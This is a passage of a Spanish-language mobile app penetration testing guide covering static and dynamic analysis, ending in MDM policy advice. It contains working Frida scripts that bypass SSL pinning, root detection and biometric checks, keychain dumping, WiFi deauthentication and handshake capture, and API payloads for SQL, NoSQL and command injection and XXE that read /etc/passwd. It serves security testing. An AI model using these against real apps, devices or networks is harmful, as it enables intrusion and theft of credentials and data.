```bash
# === EXTRACCIÓN DEL IPA ===
unzip app.ipa -d app_extracted
cd app_extracted/Payload/*.app/

# === ANÁLISIS DE Info.plist ===
plutil -p Info.plist | grep -E \
  "NSAppTransportSecurity|NSLocation|NSContacts|NSCamera|NSMicrophone"

# Verificar ATS configuration
plutil -p Info.plist | grep -A10 "NSAppTransportSecurity"

# Verificar URL schemes (deep links)
plutil -p Info.plist | grep -A5 "CFBundleURLTypes"

# Verificar entitlements
codesign -d --entitlements :- .

# === BÚSQUEDA DE SECRETOS ===
# En el binario
strings ./TargetApp | grep -iE "password|secret|api_key|token|http" | sort -u

# En archivos de recursos
find . -name "*.plist" -exec plutil -p {} \; | grep -iE "password|secret|key"
find . -name "*.json" -exec cat {} \; | grep -iE "password|secret|key"

# === CLASS-DUMP (Objective-C headers) ===
class-dump -H ./TargetApp -o headers/

# === HOPPER / IDA (análisis avanzado) ===
# Abrir binario en Hopper Disassembler o IDA Pro
# Buscar: métodos de cifrado, validación de certificados, etc.

# === ANÁLISIS DE FRAMEWORKS ===
find . -name "*.framework" -type d | while read fw; do
    echo "=== Framework: $fw ==="
    basename "$fw"
done

# === VERIFICAR BITCODE Y STRIP ===
otool -l ./TargetApp | grep -A5 "LC_ENCRYPTION_INFO"
# Si cryptid = 0, el binario no está cifrado (App Store lo cifra automáticamente)
```

---

## Fase 2: Dynamic Analysis (DAST)

### Configuración del Proxy (Burp Suite)

```bash
# === CONFIGURACIÓN BURP SUITE ===
# 1. Iniciar Burp Suite en modo proxy
# 2. Configurar listener: 0.0.0.0:8080
# 3. Configurar el dispositivo para usar el proxy

# === ANDROID: Configurar proxy ===
# Opción 1: Manual en Settings > Wi-Fi
# Opción 2: Via ADB
adb shell settings put global http_proxy <IP>:8080

# === ANDROID: Instalar certificado CA de Burp ===
# Android 11+ requiere instalar en el store del sistema
openssl x509 -inform DER -in cacert.der -out cacert.pem
HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
cp cacert.pem ${HASH}.0

# Para dispositivos rooteados
adb push ${HASH}.0 /data/local/tmp/
adb shell "su -c 'cp /data/local/tmp/${HASH}.0 /system/etc/security/cacerts/'"

# Para Android 14+ (sin root): usar Magisk module o adb install
# adb install cacert.crt (funciona parcialmente)

# === iOS: Instalar certificado CA de Burp ===
# 1. Navegar a http://burp desde Safari
# 2. Descargar e instalar el perfil
# 3. Settings > General > About > Certificate Trust Settings > Enable
```

### Frida — Instrumentación Dinámica (Android)

```bash
# === INSTALACIÓN Y CONFIGURACIÓN ===
pip3 install frida-tools
# Verificar versión de Frida compatible con el dispositivo
frida --version

# Instalar Frida server en dispositivo rooteado
# Descargar desde: https://github.com/frida/frida/releases
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "su -c '/data/local/tmp/frida-server &'"

# Verificar conexión
frida-ps -U

# === SSL PINNING BYPASS ===
frida -U -f com.target.app -l ssl-pinning-bypass.js --no-pause

# Script universal SSL Pinning Bypass (Android)
# ssl-pinning-bypass.js
Java.perform(function() {
    console.log('[*] Universal SSL Pinning Bypass');

    // Bypass TrustManager
    var TrustManager = Java.registerClass({
        name: 'com.brida.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function() {},
            checkServerTrusted: function() {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var context = SSLContext.getInstance('TLS');
    context.init(null, Java.array('Ljava.lang.Object;', [TrustManager.$new()]), null);
    var factory = context.getSocketFactory();

    var HttpsURLConnection = Java.use('javax.net.ssl.HttpsURLConnection');
    HttpsURLConnection.setSSLSocketFactory.implementation = function(f) {
        console.log('[+] Bypassing HttpsURLConnection SSL');
        return this.setSSLSocketFactory(factory);
    };

    // Bypass OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] Bypassing OkHttp CertificatePinner');
        };
    } catch(e) { console.log('[-] OkHttp CertificatePinner not found'); }

    // Bypass Trustkit
    try {
        var PinningTrustManager = Java.use('com.datatheorem.android.trustkit.pinning.OkHostnameVerifier');
        PinningTrustManager.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function() {
            console.log('[+] Bypassing Trustkit');
            return true;
        };
    } catch(e) { console.log('[-] Trustkit not found'); }

    console.log('[*] SSL Pinning bypass complete');
});

# === ROOT DETECTION BYPASS ===
frida -U -f com.target.app -l root-bypass.js --no-pause

# Script Root Detection Bypass
# root-bypass.js
Java.perform(function() {
    console.log('[*] Root Detection Bypass');

    // Bypass common root checks
    var File = Java.use('java.io.File');
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        if (path.indexOf('su') >= 0 || path.indexOf('magisk') >= 0 ||
            path.indexOf('supersu') >= 0 || path.indexOf('busybox') >= 0) {
            console.log('[+] Blocked root check: ' + path);
            return false;
        }
        return this.exists.call(this);
    };

    // Bypass Runtime.exec("su")
    var Runtime = Java.use('java.lang.Runtime');
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') >= 0) {
            console.log('[+] Blocked su command: ' + cmd);
            return null;
        }
        return this.exec.call(this, cmd);
    };

    // Bypass Build.TAGS check
    var Build = Java.use('android.os.Build');
    Build.TAGS.value = 'release-keys';

    console.log('[*] Root bypass complete');
});

# === BIOMETRIC AUTH BYPASS ===
frida -U -f com.target.app -l biometric-bypass.js --no-pause

# === INTERCEPTAR CRYPTO OPERATIONS ===
frida -U -f com.target.app -l crypto-trace.js --no-pause

# Script para trazar operaciones criptográficas
# crypto-trace.js
Java.perform(function() {
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.init.overload('int', 'java.security.Key').implementation = function(opmode, key) {
        console.log('[Cipher.init] Mode: ' + opmode + ' Key: ' + key.getAlgorithm());
        return this.init(opmode, key);
    };

    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[Cipher.doFinal] Input: ' + Java.use('java.util.Arrays').toString(input));
        var result = this.doFinal(input);
        console.log('[Cipher.doFinal] Output: ' + Java.use('java.util.Arrays').toString(result));
        return result;
    };
});
```

### Objection — Runtime Exploration

```bash
# === INSTALACIÓN ===
pip3 install objection

# === USO BÁSICO ===
# Android
objection -g com.target.app explore

# iOS (requiere jailbreak + frida)
objection -g com.target.app explore

# === COMANDOS ÚTILES ===
# Información del entorno
ios info binary
ios info jailbreak
android hooking list classes

# Bypass SSL Pinning
ios sslpinning disable
android sslpinning disable

# Bypass Root/Jailbreak detection
ios jailbreak disable
android root disable

# Explorar Keychain (iOS)
ios keychain list
ios keychain dump

# Explorar SharedPreferences (Android)
android hooking list classes | grep SharedPref
android hooking watch class android.app.SharedPreferencesImpl$EditorImpl

# Explorar archivos de la app
android hooking list activities
android intent launch_activity com.target.app.MainActivity

# Dump de memoria
memory dump all /tmp/memory_dump.bin

# Buscar instancias de clases
android hooking list instances com.target.app.UserSession

# Explorar Content Providers
android provider list
android provider query content://com.target.app.provider/users
```

### iOS Dynamic Analysis

```bash
# === CON DISPOSITIVO JAILBROKEN ===

# Instalar Frida server desde Cydia
# Buscar "Frida" en el repositorio de Cydia

# Verificar conexión
frida-ps -U

# SSL Pinning bypass (iOS)
frida -U -f com.target.app -l ios-ssl-bypass.js --no-pause

# Script SSL Pinning Bypass (iOS)
# ios-ssl-bypass.js
if (ObjC.available) {
    console.log('[*] iOS SSL Pinning Bypass');

    // Bypass NSURLSession
    var NSURLSession = ObjC.classes.NSURLSession;
    var session = NSURLSession.sessionWithConfiguration_(
        ObjC.classes.NSURLSessionConfiguration.defaultSessionConfiguration()
    );

    // Bypass TrustKit
    try {
        var TrustKit = ObjC.classes.TKTrustKit;
        console.log('[+] TrustKit detected');
    } catch(e) { console.log('[-] TrustKit not found'); }

    // Bypass AFNetworking
    try {
        var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
        AFSecurityPolicy.setSSLPinningMode_(0);
        console.log('[+] Bypassing AFNetworking SSL');
    } catch(e) { console.log('[-] AFNetworking not found'); }

    // Bypass NSURLConnection
    Interceptor.attach(
        ObjC.classes.NSURLSessionDelegate['- URLSession:didReceiveChallenge:completionHandler:'].implementation,
        {
            onEnter: function(args) {
                console.log('[+] Intercepting NSURLSession challenge');
                var completionHandler = new ObjC.Block(args[3]);
                completionHandler(1, null); // NSURLSessionAuthChallengeUseCredential
            }
        }
    );
}

# Extraer datos del Keychain
# Usar keychain-dumper (https://github.com/ptoomey3/keychain-dumper)
./keychain-dumper -e > keychain_export.txt

# Analizar tráfico con tcpdump en el dispositivo
# (requiere jailbreak)
tcpdump -i any -s 0 -w /tmp/capture.pcap
# Extraer: scp root@<device_ip>:/tmp/capture.pcap .
```

---

## Fase 3: Network Analysis

### Interceptación y Análisis de Tráfico

```bash
# === BURP SUITE ===
# Configurar proxy y interceptar tráfico
# Analizar requests/responses en la pestaña HTTP History
# Usar Repeater para modificar requests manualmente
# User Intruder para ataques automatizados

# === WIRESHARK ===
# Captura de tráfico en la red
wireshark -i eth0 -f "host <target_ip>" -w mobile_traffic.pcap

# Filtros útiles para análisis móviles
# http.request.method == "POST"
# http contains "password"
# tls.handshake.type == 1  # Client Hello
# dns.qry.name contains "target.com"

# === TCPDUMP (en dispositivo Android) ===
adb shell tcpdump -i any -s 0 -w /sdcard/capture.pcap
adb pull /sdcard/capture.pcap
wireshark capture.pcap

# === MITMPROXY (alternativa a Burp) ===
mitmproxy --mode regular --listen-port 8080
# o en modo transparente
mitmproxy --mode transparent --listen-port 8080

# === ZAP (OWASP Zed Attack Proxy) ===
# Alternativa open source a Burp Suite
zap-cli quick-scan --self-contained \
  --start-options '-config api.disablekey=true' \
  http://target.com/api

# === ANÁLISIS DE PROTOCOLOS ===
# Verificar uso de protocolos inseguros
strings capture.pcap | grep -E "http://|ftp://|telnet://"

# Analizar WebSockets
# En Burp: WS History tab
# En Wireshark: websocket

# Analizar gRPC/Protobuf
# Usar grpcurl para probar endpoints gRPC
grpcurl -plaintext target.com:443 list
grpcurl -plaintext target.com:443 describe
```

### WiFi Security Assessment

```bash
# === ANÁLISIS DE REDES WiFi ===

# Escanear redes WiFi
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon

# Detectar Evil Twin / Rogue AP
# Comparar BSSIDs con la infraestructura legítima
# Verificar si hay APs con el mismo SSID pero diferente BSSID

# Deauth attack (prueba de resiliencia)
sudo aireplay-ng -0 5 -a <BSSID> wlan0mon

# Capturar WPA handshake
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

# Análisis de seguridad WiFi del dispositivo móvil
# Verificar si el dispositivo acepta certificados de CA desconocidos
# Verificar comportamiento ante redes abiertas
# Verificar si la app funciona correctamente con VPN
```

---

## Fase 4: API Testing Móvil

### Endpoints Discovery

```bash
# === EXTRAER ENDPOINTS DE LA APP ===

# Desde el código decompilado
grep -rE "https?://[^\s\"']+" app_decompiled/ --include="*.smali" | \
  grep -oE "https?://[^/]+" | sort -u

# Desde el tráfico capturado
# Burp Suite: Target > Site Map > filtrar por API endpoints

# Desde archivos de configuración
cat app_decompiled/res/values/strings.xml | grep -E "api|endpoint|base_url"

# === TESTING DE AUTENTICACIÓN API ===

# Probar login
curl -X POST "https://api.target.com/v1/auth/login" \
  -H "Content-Type: application/json" \
  -H "User-Agent: TargetApp/1.0" \
  -d '{"email":"test@test.com","password":"password123"}'

# Probar token refresh
curl -X POST "https://api.target.com/v1/auth/refresh" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"<token>"}'

# Probar password reset
curl -X POST "https://api.target.com/v1/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"target@client.com"}'

# === TESTING DE AUTORIZACIÓN (IDOR) ===

# Obtener datos del usuario 1234
curl "https://api.target.com/v1/users/1234/profile" \
  -H "Authorization: Bearer <token_user_1234>"

# Intentar acceder al usuario 5678 con token del 1234
curl "https://api.target.com/v1/users/5678/profile" \
  -H "Authorization: Bearer <token_user_1234>"

# Probar con diferentes roles
curl "https://api.target.com/v1/admin/users" \
  -H "Authorization: Bearer <token_user_regular>"

# === TESTING DE RATE LIMITING ===

# Enviar múltiples requests rápidamente
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    "https://api.target.com/v1/auth/login" \
    -X POST -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrong"}'
done

# === TESTING DE INPUT VALIDATION ===

# SQL Injection
curl "https://api.target.com/v1/users?id=1' OR 1=1--"

# NoSQL Injection
curl -X POST "https://api.target.com/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":{"$gt":""},"password":{"$gt":""}}'

# Command Injection
curl "https://api.target.com/v1/export?format=pdf;cat /etc/passwd"

# XXE (si la API acepta XML)
curl -X POST "https://api.target.com/v1/data" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

---

## Android Security Deep Dive

### Android Architecture Security

```
┌─────────────────────────────────────────────┐
│              Application Layer               │
│  ┌─────────┐ ┌─────────┐ ┌──────────────┐  │
│  │   App   │ │   App   │ │  System Apps │  │
│  └────┬────┘ └────┬────┘ └──────┬───────┘  │
│       │           │              │           │
│  ┌────▼───────────▼──────────────▼───────┐  │
│  │     Application Framework              │  │
│  │  ActivityManager | ContentProvider     │  │
│  │  PackageManager  | NotificationManager │  │
│  └────────────────┬──────────────────────┘  │
│                   │                          │
│  ┌────────────────▼──────────────────────┐  │
│  │     Native Libraries | Android Runtime │  │
│  │  ART/Dalvik | Bionic libc | OpenGL     │  │
│  └────────────────┬──────────────────────┘  │
│                   │                          │
│  ┌────────────────▼──────────────────────┐  │
│  │          Linux Kernel                  │  │
│  │  Binder | SELinux | dm-verity | dm-crypt│ │
│  └───────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
```

### Android Security Assessment Commands

```bash
# === INFORMACIÓN DEL DISPOSITIVO ===
adb shell getprop ro.build.version.sdk      # API level
adb shell getprop ro.build.display.id       # Build number
adb shell getprop ro.product.model          # Modelo
adb shell getprop ro.boot.verifiedbootstate # Boot state
adb shell getprop ro.secure                 # Security flag
adb shell getprop ro.debuggable             # Debug flag

# === ANÁLISIS DE APLICACIONES INSTALADAS ===
# Listar todas las apps
adb shell pm list packages -f

# Listar apps de terceros
adb shell pm list packages -3

# Listar apps del sistema
adb shell pm list packages -s

# Obtener info de una app específica
adb shell dumpsys package com.target.app

# Permisos de una app
adb shell dumpsys package com.target.app | grep -A50 "permissions"

# === ANÁLISIS DE PERMISOS ===
# Permisos peligrosos
adb shell pm list permissions -g -d

# Permisos runtime concedidos
adb shell dumpsys package com.target.app | grep "granted=true"

# === ANÁLISIS DE ALMACENAMIENTO ===
# Explorar datos de la app (requiere run-as para apps debuggable)
adb shell run-as com.target.app ls -la /data/data/com.target.app/
adb shell run-as com.target.app ls -la /data/data/com.target.app/shared_prefs/
adb shell run-as com.target.app ls -la /data/data/com.target.app/databases/

# Extraer archivos de la app
adb shell run-as com.target.app cat shared_prefs/app_prefs.xml
adb pull /data/data/com.target.app/databases/app.db

# === ANÁLISIS DE COMPONENTES EXPORTADOS ===
# Activities exportadas
adb shell dumpsys package com.target.app | grep -A2 "Activity.*exported=true"

# Services exportados
adb shell dumpsys package com.target.app | grep -A2 "Service.*exported=true"

# Broadcast Receivers exportados
adb shell dumpsys package com.target.app | grep -A2 "Receiver.*exported=true"

# Content Providers exportados
adb shell dumpsys package com.target.app | grep -A2 "Provider.*exported=true"

# === EXPLOTACIÓN DE COMPONENTES EXPORTADOS ===
# Lanzar Activity exportada
adb shell am start -n com.target.app/.ExportActivity --es "data" "malicious"

# Enviar Broadcast a receiver exportado
adb shell am broadcast -a com.target.app.CUSTOM_ACTION --es "payload" "test"

# Consultar Content Provider exportado
adb shell content query --uri content://com.target.app.provider/data

# Insertar en Content Provider
adb shell content insert --uri content://com.target.app.provider/data \
  --bind name:s:test --bind value:i:123

# === ANÁLISIS DE INTENTS ===
# Monitorizar Intents
adb shell am monitor

# Intent Sniffing con Frida
frida -U -f com.target.app -l intent-sniff.js --no-pause

# === ANÁLISIS DE BINDER ===
# Ver comunicaciones Binder
adb shell cat /dev/binderfs/binder_logs/state
adb shell dmesg | grep -i binder

# === ANÁLISIS DE SEGURIDAD DEL KERNEL ===
# Verificar SELinux
adb shell getenforce
adb shell sestatus

# Verificar dm-verity
adb shell getprop ro.boot.veritymode

# Verificar cifrado
adb shell getprop ro.crypto.state

# Verificar verified boot
adb shell getprop ro.boot.verifiedbootstate
```

### Android Network Security Configuration

```xml
<!-- res/xml/network_security_config.xml -->
<!-- Ejemplo de configuración insegura -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <!-- INSEGURO: permite cleartext -->
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>

    <!-- INSEGURO: confía en certificados de usuario -->
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">target.com</domain>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- INSEGURO -->
        </trust-anchors>
    </domain-config>
</network-security-config>

<!-- Configuración SEGURA -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    <domain-config>
        <domain includeSubdomains="true">target.com</domain>
        <pin-set expiration="2025-01-01">
            <pin digest="SHA-256">base64encodedSHA256PinHere=</pin>
            <pin digest="SHA-256">backupPinHere=</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

---

## iOS Security Deep Dive

### iOS Security Architecture

```
┌─────────────────────────────────────────────┐
│              Application Layer               │
│  ┌─────────┐ ┌─────────┐ ┌──────────────┐  │
│  │   App   │ │   App   │ │  System Apps │  │
│  │ (Sandbox)│ │(Sandbox)│ │              │  │
│  └────┬────┘ └────┬────┘ └──────┬───────┘  │
│       │           │              │           │
│  ┌────▼───────────▼──────────────▼───────┐  │
│  │     Cocoa Touch | Media | Services     │  │
│  └────────────────┬──────────────────────┘  │
│                   │                          │
│  ┌────────────────▼──────────────────────┐  │
│  │     Core OS | Core Services            │  │
│  │  Security.framework | Keychain         │  │
│  │  CryptoKit | CommonCrypto              │  │
│  └────────────────┬──────────────────────┘  │
│                   │                          │
│  ┌────────────────▼──────────────────────┐  │
│  │          XNU Kernel                    │  │
│  │  Sandbox | Code Signing | ASLR         │  │
│  │  AMFI | KPP/PAC | Secure Enclave      │  │
│  └───────────────────────────────────────┘  │
└─────────────────────────────────────────────┘
```

### iOS Security Assessment Commands

```bash
# === INFORMACIÓN DEL DISPOSITIVO ===
ideviceinfo | grep -E "ProductType|ProductVersion|BuildVersion"
ideviceinfo | grep -E "DeviceName|HardwareModel|CPUArchitecture"

# Verificar jailbreak status
# Buscar Cydia, checkra1n, unc0ver, Taurine, Dopamine
ideviceinstaller list | grep -i "cydia\|checkra1n\|unc0ver"

# === ANÁLISIS DE APLICACIONES ===
# Listar apps instaladas
ideviceinstaller list

# Listar apps del sistema
ideviceinstaller list -o list_system

# === ANÁLISIS DE INFO.PLIST ===
plutil -p Payload/*.app/Info.plist

# Verificar ATS
plutil -p Payload/*.app/Info.plist | grep -A10 "NSAppTransportSecurity"

# Verificar permisos solicitados
plutil -p Payload/*.app/Info.plist | grep -E \
  "NSLocation|NSCamera|NSMicrophone|NSContacts|NSPhotoLibrary|NSFaceID"

# Verificar URL schemes
plutil -p Payload/*.app/Info.plist | grep -A5 "CFBundleURLTypes"

# Verificar App Groups (compartición de datos)
plutil -p Payload/*.app/Info.plist | grep -A5 "ApplicationGroups"

# === ANÁLISIS DE ENTITLEMENTS ===
codesign -d --entitlements :- Payload/*.app/

# Verificar capabilities
codesign -d --entitlements :- Payload/*.app/ | grep -E \
  "keychain-access-groups|application-identifier|aps-environment"

# === ANÁLISIS DE KEYCHAIN ===
# En dispositivo jailbroken con keychain-dumper
./keychain-dumper -a  # Todos los items
./keychain-dumper -e  # Items genéricos (passwords)
./keychain-dumper -c  # Items de certificados

# Con objection
objection -g com.target.app explore
ios keychain list
ios keychain dump
ios keychain clear

# === ANÁLISIS DE KEYCHAIN ACCESS GROUPS ===
# Verificar si la app comparte Keychain con otras apps
codesign -d --entitlements :- Payload/*.app/ | grep "keychain-access-groups"

# === ANÁLISIS DE APP SANDBOX ===
# Verificar container de la app
# En dispositivo jailbroken:
ls -la /var/mobile/Containers/Data/Application/
ls -la /var/mobile/Containers/Bundle/Application/

# Analizar archivos de la app
find /var/mobile/Containers/Data/Application/<UUID>/ -name "*.db" -o -name "*.plist"

# === ANÁLISIS DE PROTECTION CLASSES ===
# Verificar NSFileProtectionKey de archivos
# En dispositivo jailbroken:
xattr -l /var/mobile/Containers/Data/Application/<UUID>/Documents/sensitive.dat

# === ANÁLISIS DE PASTEBOARD (CLIPBOARD) ===
# Con Frida
frida -U -f com.target.app -l clipboard-monitor.js --no-pause

# Script clipboard monitor
# clipboard-monitor.js
if (ObjC.available) {
    var UIPasteboard = ObjC.classes.UIPasteboard;
    var generalPasteboard = UIPasteboard.generalPasteboard();

    // Monitor read
    var origString = generalPasteboard.string;
    // Interceptar acceso al pasteboard
    console.log('[+] Monitoring clipboard access');
}

# === ANÁLISIS DE WEBVIEW ===
# Verificar JavaScript habilitado
# Verificar JavaScript bridges
grep -rE "WKUserContentController|addJavascriptInterface" \
  headers/ --include="*.h"

# === ANÁLISIS DE LOCAL AUTHENTICATION (BIOMETRICS) ===
# Verificar uso de LAContext
grep -rE "LAContext|evaluatePolicy|biometryType" \
  headers/ --include="*.h"

# Bypass de biometric auth con Frida
# ios-biometric-bypass.js
if (ObjC.available) {
    var LAContext = ObjC.classes.LAContext;
    LAContext['- evaluatePolicy:localizedReason:reply:'].implementation = function(policy, reason, reply) {
        console.log('[+] Biometric auth bypassed');
        reply(true, null);
    };
}
```

### iOS App Transport Security (ATS)

```xml
<!-- Info.plist - Configuración INSEGURA -->
<key>NSAppTransportSecurity</key>
<dict>
    <!-- INSEGURO: deshabilita ATS completamente -->
    <key>NSAllowsArbitraryLoads</key>
    <true/>

    <!-- INSEGURO: excepción para dominio específico sin cifrado -->
    <key>NSExceptionDomains</key>
    <dict>
        <key>target.com</key>
        <dict>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <true/>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.0</string>
        </dict>
    </dict>
</dict>

<!-- Configuración SEGURA -->
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <key>api.target.com</key>
        <dict>
            <key>NSExceptionMinimumTLSVersion</key>
            <string>TLSv1.2</string>
            <key>NSExceptionRequiresForwardSecrecy</key>
            <true/>
            <key>NSExceptionAllowsInsecureHTTPLoads</key>
            <false/>
        </dict>
    </dict>
</dict>
```

---

## Reversing de Aplicaciones Móviles

### Android Reversing

```bash
# === JADX-GUI (análisis interactivo) ===
jadx-gui app.apk

# === APKTOOL (análisis de recursos y Smali) ===
apktool d app.apk -o app_dec --force-all
apktool d app.apk -o app_dec_no_res --no-resources --no-src

# Rebuild después de modificaciones
apktool b app_dec -o modified.apk
# Firmar el APK modificado
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore debug.keystore modified.apk androiddebugkey
# o con apksigner
apksigner sign --ks debug.keystore modified.apk

# === ANÁLISIS DE NATIVE LIBRARIES (.so) ===
# Strings analysis
strings lib/arm64-v8a/libnative.so | grep -iE "http|password|secret|key"

# Symbol analysis
nm -D lib/arm64-v8a/libnative.so | grep -iE "crypto|cipher|encrypt|ssl"

# Radare2 analysis
r2 -A lib/arm64-v8a/libnative.so
# En radare2:
# afl — listar functions
# pdf @ sym.encrypt_function — disassemble function
# iz — listar strings

# Ghidra (análisis avanzado)
# Importar el .so file en Ghidra
# Analizar con el decompiler

# === DEX ANALYSIS ===
# Extraer DEX files
unzip app.apk classes*.dex

# Analyze DEX with baksmali
baksmali disassemble classes.dex -o smali_output/

# === MODIFICACIÓN DE APK (TAMPERING) ===
# 1. Decompilar
apktool d app.apk -o app_dec

# 2. Modificar Smali code
# Ejemplo: cambiar una validación
sed -i 's/if-eqz/if-nez/' app_dec/smali/com/target/app/Validator.smali

# 3. Rebuild
apktool b app_dec -o modified.apk

# 4. Firmar
keytool -genkey -v -keystore temp.keystore -alias temp -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 \
  -keystore temp.keystore modified.apk temp

# 5. Alinear
zipalign -v 4 modified.apk modified_aligned.apk
```

### iOS Reversing

```bash
# === EXTRACCIÓN DE IPA (dispositivo jailbroken) ===
# Con frida-ios-dump
python3 dump.py com.target.app

# Con clutch
clutch -d com.target.app

# === CLASS-DUMP (headers de Objective-C) ===
class-dump -H Payload/*.app/TargetApp -o headers/

# === HOPPER DISASSEMBLER ===
# Abrir el binario de la app en Hopper
# Analizar strings, cross-references, pseudo-code

# === IDA PRO (análisis avanzado) ===
# Abrir el binario en IDA Pro
# Usar el decompiler Hex-Rays para pseudo-code

# === ANÁLISIS DE STRINGS ===
strings Payload/*.app/TargetApp | grep -iE "password|secret|api|http|key|token"

# === ANÁLISIS DE ENCRYPTED APPS ===
# Verificar si el binario está cifrado (App Store)
otool -l Payload/*.app/TargetApp | grep -A4 "LC_ENCRYPT"
# cryptid = 1 → cifrado (necesita dump desde dispositivo)

# === RUNTIME ANALYSIS CON FIDA ===
# Hook a métodos específicos
frida -U -f com.target.app -l ios-hook.js --no-pause

# Script para hook de método específico
# ios-hook.js
if (ObjC.available) {
    // Hook a un método de validación
    var Validator = ObjC.classes.Validator;
    Validator['- isValidToken:'].implementation = function(token) {
        console.log('[+] Hooked isValidToken: ' + token);
        return true; // Siempre válido
    };

    // Hook a cifrado AES
    var CryptoHelper = ObjC.classes.CryptoHelper;
    if (CryptoHelper) {
        CryptoHelper['- encryptData:withKey:'].implementation = function(data, key) {
            console.log('[+] encryptData called');
            console.log('    Data: ' + data);
            console.log('    Key: ' + key);
            return this.encryptData_withKey_(data, key);
        };
    }
}
```

---

## MDM/EMM — Despliegue y Gestión

### Soluciones MDM/EMM Recomendadas

| Solución | Tipo | Plataformas | Caso de Uso | Precio Aprox. |
|----------|------|-------------|-------------|---------------|
| **Microsoft Intune** | Cloud | Android, iOS, Windows, macOS | Entornos Microsoft 365 / Azure AD | $8-12 USD/user/mes |
| **VMware Workspace ONE** | Cloud/On-prem | Android, iOS, Windows, macOS, ChromeOS | Enterprise multi-platform | $4-15 USD/device/mes |
| **Jamf Pro** | Cloud | iOS, macOS, tvOS | Entornos Apple-only | $7-13 USD/device/mes |
| **Google Endpoint Management** | Cloud | Android, ChromeOS, iOS, Windows | Entornos Google Workspace | Incluido en WS |
| **ManageEngine MDM** | Cloud/On-prem | Android, iOS, Windows, macOS | Budget-friendly / SMB | $1-5 USD/device/mes |
| **Hexnode MDM** | Cloud/On-prem | Android, iOS, Windows, macOS | Mid-market | $1-4 USD/device/mes |
| **SOTI MobiControl** | Cloud/On-prem | Android, iOS, Windows | Dispositivos rugged / IoT | $3-6 USD/device/mes |

### Arquitectura MDM/EMM

```
┌─────────────────────────────────────────────────────┐
│                  MDM Server (Cloud/On-prem)          │
│  ┌──────────┐ ┌──────────┐ ┌──────────────────────┐ │
│  │ Policy   │ │ App      │ │ Device               │ │
│  │ Engine   │ │ Catalog  │ │ Inventory            │ │
│  └────┬─────┘ └────┬─────┘ └──────────┬───────────┘ │
│       │            │                   │              │
│  ┌────▼────────────▼───────────────────▼───────────┐ │
│  │              MDM Protocol (APNs/FCM)             │ │
│  └────┬──────────────────────────────────┬─────────┘ │
└───────┼──────────────────────────────────┼───────────┘
        │                                  │
   ┌────▼─────┐  ┌──────────┐  ┌──────────▼────┐
   │  iOS     │  │ Android  │  │   Windows     │
   │ Device   │  │ Device   │  │   Device      │
   │          │  │          │  │               │
   │ MDM      │  │ Android  │  │ MDM Client    │
   │ Profile  │  │ Enterprise│ │               │
   └──────────┘  │ (Device/  │  └───────────────┘
                 │  Profile  │
                 │  Owner)   │
                 └──────────┘
```

### Políticas MDM Recomendadas por Categoría

#### 1. Seguridad del Dispositivo
```
Políticas de Contraseña:
├── Requerir PIN/contraseña: SÍ
├── Longitud mínima: 8 caracteres (alfanuméricos)
├── Complejidad: Mayúsculas + minúsculas + números
├── Intentos fallidos antes de wipe: 10
├── Historial de contraseñas: últimas 5
├── Tiempo de expiración: 90 días
└── Bloqueo automático: 2 minutos de inactividad

Cifrado:
├── Requerir cifrado de dispositivo: SÍ
├── Requerir cifrado de tarjeta SD: SÍ (Android)
└── Verificar estado de cifrado: Continuo

Restricciones de Hardware:
├── Bloquear dispositivos rooteados/jailbreak: SÍ
├── Bloquear cámaras en áreas restringidas: Según política
├── Bloquear captura de pantalla en apps sensibles: SÍ
├── Bloquear USB debugging: SÍ
└── Bloquear instalación de fuentes desconocidas: SÍ (Android)
```

#### 2. Gestión de Aplicaciones (MAM)
```
App Management:
├── Catálogo de apps aprobadas (whitelist): Configurar
├── Apps prohibidas (blacklist): Configurar
├── Forzar actualizaciones de apps: SÍ
├── Distribución de apps corporativas: SÍ
├── Configuración de VPN por app: SÍ
├── Modo kiosk (si aplica): Configurar
├── Borrado selectivo de datos corporativos: SÍ
└── Contenedorización de datos corporativos: SÍ

App Configuration:
├── Preconfigurar credenciales de apps corporativas
├── Configurar servidores de email automáticamente
